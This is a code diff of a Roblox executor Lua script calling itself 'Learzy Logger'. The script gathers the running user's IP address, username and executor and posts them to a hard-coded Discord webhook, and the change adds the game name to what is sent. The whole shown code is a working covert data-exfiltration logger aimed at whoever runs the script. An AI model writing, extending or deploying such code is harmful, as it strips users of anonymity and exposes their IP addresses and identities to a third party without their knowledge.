@@ -38,6 +38,7 @@ local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCY
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
 local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
 
@@ -58,10 +59,22 @@ local function getClientInfo()
     return ip, device
 end
 
+local function getGameName()
+    local success, info = pcall(function()
+        return MarketplaceService:GetProductInfo(game.PlaceId)
+    end)
+    if success and info and info.Name then
+        return info.Name
+    else
+        return "Unknown Game"
+    end
+end
+
 local function sendWebhook()
     if not requestFunction then return end
     local ip, device = getClientInfo()
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
+    local gameName = getGameName()
 
     local payload = {
         ["content"] = "",
@@ -73,6 +86,7 @@ local function sendWebhook()
                 {["name"] = "Username", ["value"] = username, ["inline"] = true},
                 {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                 {["name"] = "Executor", ["value"] = device, ["inline"] = false},
+                {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                 {["name"] = "Game PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
             },
             ["footer"] = {["text"] = "Learzy Logger"},
